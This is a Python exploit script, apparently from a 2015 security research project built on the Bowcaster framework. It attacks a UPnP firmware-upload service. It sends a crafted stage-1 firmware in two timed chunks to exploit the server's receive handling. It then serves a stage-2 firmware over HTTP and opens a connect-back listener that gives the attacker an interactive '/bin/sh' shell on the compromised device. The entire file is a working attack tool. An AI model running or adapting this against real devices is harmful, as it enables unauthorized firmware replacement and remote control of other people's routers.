#!/usr/bin/env python
#!/usr/bin/env python

# Copyright (c) 2015
# - Zachary Cutlip <uid000()gmail.com>
# 
# See LICENSE for more details.
# 

import base64
import sys
import socket
import time
import os
import traceback

from setfirmware import SetFirmwareRequest

from bowcaster.common.support import LittleEndian
from bowcaster.development import OverflowBuffer
from bowcaster.common import Logging
from bowcaster.common.support import Logging
from bowcaster.servers.http_server import HTTPConnectbackServer
from bowcaster.servers import ConnectbackServer

from environment import TARGET
from environment import UPNP_PORT
from environment import HTTP_PORT
from environment import CONNECTBACK_PORT
from environment import STAGE1
from environment import STAGE2
from environment import SRVROOT

class UPNPFirmwareExploit(object):
    def __init__(self,host,port,fw_stage1,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        min_content_length=102401
        self.logger=logger
        self.host=host
        self.port=port
        
        request=SetFirmwareRequest(firmware_file=fw_stage1,logger=logger)
        self.request=request
        
    def send(self):
        self.__special_upnp_send()
    
    def __special_upnp_send(self):
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((self.host,self.port))
        data=str(self.request)
        """only send first 8190 bytes of request"""
        self.logger.LOG_DEBUG("Sending first 8190 bytes to %s" % self.host)
        sock.send(data[:8190]) 
    
        """sleep to ensure first recv()
        only gets this first chunk."""
        self.logger.LOG_DEBUG("Sleeping.")
        time.sleep(1)
    
        """Hopefully in upnp_receiv_firmware_packets()
        by now, so we can send the rest."""
        self.logger.LOG_DEBUG("Sending remainder of request to %s" % self.host)
        sock.send(data[8190:])
    
        """
        Sleep a bit more so server doesn't end up
        in an infinite select() loop.
        Select's timeout is set to 1 sec,
        so we need to give enough time
        for the loop to go back to select,
        and for the timeout to happen,
        returning an error."""
        self.logger.LOG_DEBUG("Sleeping.")
        time.sleep(10)
        sock.close()
        self.logger.LOG_DEBUG("Done sending request.")



def do_tcp_connectback(port,logger):
    server=None
    pid=None
    try:
        server=ConnectbackServer("0.0.0.0",port=port,startcmd="/bin/sh -i")
        pid=server.serve()
    except Exception as e:
        logger.LOG_WARN("Error starting server.")
        raise e
    return(server,pid)
    
def do_http_connectback(files_to_serve,port,docroot,logger):
    httpd=None
    pid=None
    try:
        logger.LOG_DEBUG("Starting server on port %d" % port)
        logger.LOG_DEBUG("Files to serve: %s" % str(files_to_serve))
        logger.LOG_DEBUG("Document root: %s" % docroot)
        httpd=HTTPConnectbackServer("",files_to_serve,port=port,docroot=docroot,logger=logger)
        pid=httpd.serve()
    except Exception as e:
        logger.LOG_WARN("Error starting server.")
        logger.LOG_WARN("%s" % str(e))
        sys.exit(1)
    return (httpd,pid)

def main(stage1,stage2,docroot):
    logger=Logging(max_level=Logging.DEBUG)
    
    """
    Start servers
    """
    try:
        logger.LOG_INFO("Starting HTTP connect-back server.")
        httpd,http_pid=do_http_connectback([stage2],HTTP_PORT,docroot,logger)
        logger.LOG_INFO("HTTP server started.")
    except Exception as e:
        print e
        sys.exit(1)

    try:
        logger.LOG_INFO("Starting reverse-tcp server.")
        connect_back,cb_pid=do_tcp_connectback(CONNECTBACK_PORT,logger)
        logger.LOG_INFO("Reverse-tcp server started.")
    except Exception as e:
        print e
        httpd.shutdown()
        sys.exit(1)
    
    """
    Exploit UPnP
    """
    try:
        logger.LOG_DEBUG("Instantiating UPnP firmware exploit.")
        exploit=UPNPFirmwareExploit(TARGET,UPNP_PORT,stage1,logger=logger)
        logger.LOG_INFO("Sending stage 1 firmware.")
        exploit.send()
        logger.LOG_INFO("Done with stage 1 firmware.")
    except KeyboardInterrupt:
        logger.LOG_WARN("Interrupted. Shutting down.")
        httpd.shutdown()
        connect_back.shutdown()
        sys.exit(1)
    except Exception as e:
        logger.LOG_WARN("Caught exception. %s" % str(e))
        logger.LOG_WARN("Shutting down httpd.")
        httpd.shutdown()
        logger.LOG_WARN("Shutting down connect back server.")
        connect_back.shutdown()
        #raise e
        sys.exit(1)
    
    
    """
    Wait for servers to finish.
    """
    logger.LOG_INFO("Serving stage 2 firmware.")
    try:
        logger.LOG_INFO("Waiting for server to terminate. PID: %d" % http_pid)
        httpd.wait()
    except Exception as e:
        logger.LOG_WARN("Error with HTTP server: %s" % str(e))
        connect_back.shutdown()
        httpd.shutdown()
        #not sure if this is fatal or not.
        #We probably killed with ctrl+c
        sys.exit(1)
    
    logger.LOG_INFO("HTTP server terminated.")
    logger.LOG_INFO("Done serving with stage 2 firmware.")
    
    logger.LOG_INFO("Waiting for incoming remote shell.")
    try:
        logger.LOG_INFO("Waiting for reverse-tcp server to terminate.")
        connect_back.wait()
    except Exception as e:
        #pretty sure this happens when we ctrl+c during a reverse-tcp shell.
        logger.LOG_INFO("Shutting down reverse-tcp server.")
        connect_back.shutdown()
        httpd.shutdown()
    
    logger.LOG_INFO("Exploitation of %s complete." % TARGET)
    
    httpd.shutdown()
    connect_back.shutdown()
    sys.exit(0)
    
    
    
    
if __name__ == "__main__":
    docroot=SRVROOT
    stage1=docroot+"/"+STAGE1
    try:
        main(stage1,STAGE2,docroot)
    except Exception as e:
        Logging().LOG_WARN("Exploit failed: %s" % str(e))

    
